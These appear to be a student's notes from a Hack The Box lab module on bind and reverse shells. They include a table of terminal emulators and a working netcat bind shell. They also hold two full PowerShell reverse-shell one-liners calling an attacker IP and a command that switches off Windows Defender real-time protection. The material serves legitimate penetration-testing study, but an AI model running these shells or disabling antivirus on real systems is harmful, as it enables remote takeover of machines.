# Shells and Payloads

## Anatomy of a Shell

- Every operating system uses a *terminal emulator* to allow us to interact with a shell. Below is a table of common terminal emulators:

| Terminal Emulator | Operating System |
| --- | --- |
| Windows Terminal | Windows |
| cmder | Windows |
| PuTTY | Windows |
| kitty | Windows, Linux, macOS |
| Alacritty | Windows, Linux, macOS |
| xterm | Linux |
| GNOME Terminal | Linux |
| MATE Terminal | Linux |
| Konsole | Linux |
| Terminal | macOS |
| iTerm2 | macOS |


- Command Language Interpreter: It converts the user command into an operating system instruction in real time.


### Example

In the HTB Pwnbox, we can click the green icon to open the `MATE` terminal emulator.

![Image Not Found](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/115/green-square.png)

### Exercises

> Just use the commands in the questions.


## Bind Shells

- Definition: A shell where the target has the listener running and the attacker connects to it.

![Image Not Found](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/115/bindshell.png)

- Challenges with a bindshell:
    - There needs to be an existing listener for this to work
    - Admins typically configure very strict incoming firewall rules and NAT on the edge of the network. So we can usually only do this from the internal network.
    - OS firewalls won't allow connections that aren't associated with trusted network-based applications.


### Using GNU Netcat 

1. Start the netcat listener on the victim box:

```bash
nc -lvnp 7777
```

2. Connect the attacker box to the listener:

```bash
nc -nv <ip> 7777
```

### Establishing a bindshell with Netcat

1. Binding a bash shell to the listener on the victim:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <victim_ip> 7777 > /tmp/f
```

2. Connecting to the bindshell from the attacker:

```bash
nc -nv <ip> 7777
```

> NOTE: You can find more bindshells on [RevShells](https://www.revshells.com/)


## Reverse Shells

- With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

![Image Not Found](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/115/reverseshell.png)

- [Reverse Shell CheatSheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

### Example Of a Reverse Shell in Windows

- Attack Box:

```bash
$ sudo nc -lvnp 443 # We are using a common port here 443, though this is usually reserved for https, because firewalls may block access to uncommon ports.
```

- Victim Box (Windows):

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> Note: If we are using Pwnbox, keep in mind that some browsers do not work as seamlessly when using the Clipboard feature to paste a command directly into the CLI of a target. In these cases, we may want to paste into Notepad on the target, then copy & paste from inside the target.

- Normally the above command will get blocked by the Windows Antivirus. So we'll disable it first and then run the code again. For this we'll need powershell to be run as administrator:

```bash
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

This should give us a connection.

### Exercises

1. client
2. Use this command 

```$LHOST = "<ip>"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()``` 

for getting a reverse shell.

Then do:

```bash
$env:COMPUTERNAME
```

to get the Windows system hostname.
